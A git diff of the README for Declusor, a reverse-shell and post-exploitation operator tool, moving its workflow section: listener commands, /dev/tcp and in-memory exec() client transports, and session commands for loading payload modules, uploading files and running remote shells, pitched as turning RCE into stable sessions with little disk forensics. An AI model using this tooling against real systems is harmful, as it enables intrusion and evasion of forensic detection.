@@ -69,7 +69,69 @@ In other words, Declusor handles the operational details around the session rath
 3. Provides full command recall (`Up`/`Down`), history search (`Ctrl+R`), and tab-completion for remote executables and local paths.
 4. Modules and post-exploitation scripts are staged directly into remote process memory, eliminating temporary files in `/tmp` and minimizing disk forensics.
 
-## Practical Usage
+## Real-World Workflow Examples
+
+### 1. Start the Listener
+
+Start Declusor by specifying your local listening IP and port:
+
+```bash
+# Default listener (uses native shell_socket client)
+declusor 0.0.0.0 4444
+
+# Select the cross-platform Python client
+declusor 0.0.0.0 4444 --plugin py_socket
+
+# Load external custom plugins from an operator directory
+declusor 0.0.0.0 4444 --plugin-dir ~/custom_plugins --plugin my_agent
+```
+
+On startup, Declusor initializes the listener and **prints the exact one-liner launcher command** to run on your target.
+
+### 2. Built-in Client Transports
+
+| Client Plugin     | Flag              | Target OS             | Execution Mechanism                                                    |
+| :---------------- | :---------------- | :-------------------- | :--------------------------------------------------------------------- |
+| **Shell Socket**  | `-c shell_socket` | Linux / POSIX         | Native `/dev/tcp` file descriptor; zero external dependencies          |
+| **Python Socket** | `-c py_socket`    | Linux, macOS, Windows | In-memory `exec()` with persistent session scope & subprocess fallback |
+
+### 3. Interact with the Session
+
+Once your target connects back, Declusor drops you into an interactive session:
+
+```text
+[declusor] help
+help    : Display detailed information about available commands or a specific command.
+load    : Load a payload module from your local system and execute it on the remote system.
+command : Execute a single command on the remote system.
+shell   : Initiate an interactive shell session on the remote system.
+upload  : Upload a file from the local system to the remote system.
+execute : Execute a program or script from the local system on the remote system.
+exit    : Terminate the session and exit the program.
+```
+
+#### Example: Running Commands
+
+```text
+[declusor] command id && uname -a
+uid=1000(dev) gid=1000(dev) groups=1000(dev),27(sudo)
+Linux target-node 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
+```
+
+#### Example: In-Memory Module Loading
+
+```text
+[declusor] load discovery/system_info.py
+
+SYSTEM INFORMATION
+------------------
+OS: Linux 6.8.0-45-generic (#45-Ubuntu SMP PREEMPT_DYNAMIC)
+Architecture: x86_64
+Hostname: target-host
+User: dev
+```
+
+## Practical Usage Examples
 
 Declusor is purpose-built to turn unauthenticated Remote Code Execution (RCE) and Command Injection vulnerabilities into stable, feature-rich operator sessions.
 
@@ -192,68 +254,6 @@ pip install -e ".[dev,testing]"
 # Install native plugins in editable mode
 make install-plugins
 # (or: pip install -e plugins/shell_socket -e plugins/py_socket)
-```
-
-## Real-World Workflow & Usage
-
-### 1. Start the Listener
-
-Start Declusor by specifying your local listening IP and port:
-
-```bash
-# Default listener (uses native shell_socket client)
-declusor 0.0.0.0 4444
-
-# Select the cross-platform Python client
-declusor 0.0.0.0 4444 --plugin py_socket
-
-# Load external custom plugins from an operator directory
-declusor 0.0.0.0 4444 --plugin-dir ~/custom_plugins --plugin my_agent
-```
-
-On startup, Declusor initializes the listener and **prints the exact one-liner launcher command** to run on your target.
-
-### 2. Built-in Client Transports
-
-| Client Plugin     | Flag              | Target OS             | Execution Mechanism                                                    |
-| :---------------- | :---------------- | :-------------------- | :--------------------------------------------------------------------- |
-| **Shell Socket**  | `-c shell_socket` | Linux / POSIX         | Native `/dev/tcp` file descriptor; zero external dependencies          |
-| **Python Socket** | `-c py_socket`    | Linux, macOS, Windows | In-memory `exec()` with persistent session scope & subprocess fallback |
-
-### 3. Interact with the Session
-
-Once your target connects back, Declusor drops you into an interactive session:
-
-```text
-[declusor] help
-help    : Display detailed information about available commands or a specific command.
-load    : Load a payload module from your local system and execute it on the remote system.
-command : Execute a single command on the remote system.
-shell   : Initiate an interactive shell session on the remote system.
-upload  : Upload a file from the local system to the remote system.
-execute : Execute a program or script from the local system on the remote system.
-exit    : Terminate the session and exit the program.
-```
-
-#### Example: Running Commands
-
-```text
-[declusor] command id && uname -a
-uid=1000(dev) gid=1000(dev) groups=1000(dev),27(sudo)
-Linux target-node 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
-```
-
-#### Example: In-Memory Module Loading
-
-```text
-[declusor] load discovery/system_info.py
-
-SYSTEM INFORMATION
-------------------
-OS: Linux 6.8.0-45-generic (#45-Ubuntu SMP PREEMPT_DYNAMIC)
-Architecture: x86_64
-Hostname: target-host
-User: dev
 ```
 
 ## Extensible Plugin Ecosystem
